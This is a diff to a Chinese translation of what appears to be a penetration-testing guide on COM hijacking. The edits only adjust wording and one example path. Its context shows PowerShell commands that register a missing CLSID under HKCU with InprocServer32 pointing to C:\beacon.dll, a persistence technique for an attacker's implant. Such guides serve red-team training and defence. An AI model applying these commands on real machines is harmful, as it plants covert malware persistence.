@@ -10,7 +10,7 @@
 - 其中 _Result_ 为 **NAME NOT FOUND**。
 - 并且 _Path_ 以 **InprocServer32** 结尾。
 
-一旦你决定了要冒充哪个不存在的 COM，执行以下命令。_如果你决定冒充每几秒加载一次的 COM，请小心，因为这可能会过于激进。_
+一旦你决定了要伪装的不存在的 COM，执行以下命令。_如果你决定伪装每几秒加载一次的 COM，请小心，因为这可能会过于激进。_
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -45,7 +45,7 @@ Write-Host
 
 # 示例输出:
 <strong># 任务名称:  示例
-</strong># 任务路径:  \Microsoft\Windows\示例\
+</strong># 任务路径:  \Microsoft\Windows\Example\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [更多类似于前面的...]</code></pre>
 
